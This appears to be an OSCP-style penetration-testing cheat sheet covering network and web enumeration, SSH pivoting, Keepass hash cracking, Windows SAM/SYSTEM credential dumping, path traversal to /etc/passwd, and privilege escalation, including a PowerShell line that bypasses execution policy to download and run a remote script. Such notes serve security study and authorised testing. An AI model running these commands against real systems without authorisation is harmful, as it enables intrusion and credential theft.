# Comprehensive Enumeration Notes

## **1. Network Enumeration**

### **1.1 Basic Network Scanning**
#### **Nmap Scans**
```bash
nmap -sC -sV -p- -oN full_scan.txt <target_ip>
```
- `-sC` : Runs default scripts
- `-sV` : Version detection
- `-p-` : Scans all 65535 ports
- `-oN` : Saves output

#### **Aggressive Scan**
```bash
nmap -A -T4 <target_ip>
```
- `-A` : Enables OS detection, script scanning, and traceroute
- `-T4` : Faster timing template

#### **Firewall Evasion**
```bash
nmap -f -D RND:5 <target_ip>
```
- `-f` : Fragment packets
- `-D RND:5` : Use 5 random decoys

### **1.2 SMB Enumeration**
```bash
smbmap -H <target_ip>
enum4linux -a <target_ip>
nmap --script smb-enum* -p 445 <target_ip>
```

---

## **2. SSH Enumeration & Exploitation**

### **2.1 Checking for SSH Keys**
```bash
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
```

### **2.2 Generating SSH Keys**
```bash
ssh-keygen -t rsa -b 4096 -f my_key
```
- `-t rsa` : Specifies RSA key
- `-b 4096` : Bit length
- `-f my_key` : Output file

### **2.3 SSH Authentication**
```bash
ssh -i my_key user@<target_ip>
```

### **2.4 SSH Tunneling & Pivoting**
#### **Port Forwarding (Local to Remote)**
```bash
ssh -L 8080:localhost:80 user@<target_ip>
```
- Forwards local 8080 to remote 80

#### **Dynamic Proxy for Pivoting**
```bash
ssh -D 9050 user@<target_ip>
proxychains nmap -sT -Pn -n -p- target_internal_ip
```
- `-D 9050` : SOCKS proxy
- Use ProxyChains to route traffic

---

## **3. Web Enumeration**

### **3.1 Directory and File Enumeration**
```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -u http://<target_ip>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### **3.2 CMS Enumeration**
```bash
wpscan --url http://<target_ip> --enumerate u,p
```
#### **Joomla**
```bash
joomscan --url http://<target_ip> ```

---

## **4. Credential Dumping & Password Cracking**

### **4.1 Keepass2 (.kdbx) File Extraction**
```bash
keepass2john myfile.kdbx > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### **4.2 SAM & SYSTEM Dumping (Windows)**
```powershell
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```
```bash
secretsdump.py -sam sam.save -system system.save LOCAL
```

---

## **5. Privilege Escalation**

### **5.1 Linux Privilege Escalation**
```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

### **5.2 Windows Privilege Escalation**
```powershell
whoami /priv
winpeas.exe
```

---

## **6. Automated Enumeration Tools**

### **6.1 Linux PrivEsc**
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### **6.2 Windows PrivEsc**
```powershell
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat')"
```

---

## **7. Fuzzing Techniques**
```bash
sqlmap -u "http://<target_ip>/index.php?id=1" --dbs
```
```bash
curl http://<target_ip>/?file=../../../../etc/passwd
```

---

## **Conclusion**
This **detailed enumeration cheat sheet** covers all necessary commands, tools, and techniques required for **network, web, SSH, tunneling, Keepass2, system enumeration, privilege escalation, and OSCP-level enumeration**. 🚀 Happy Hacking!

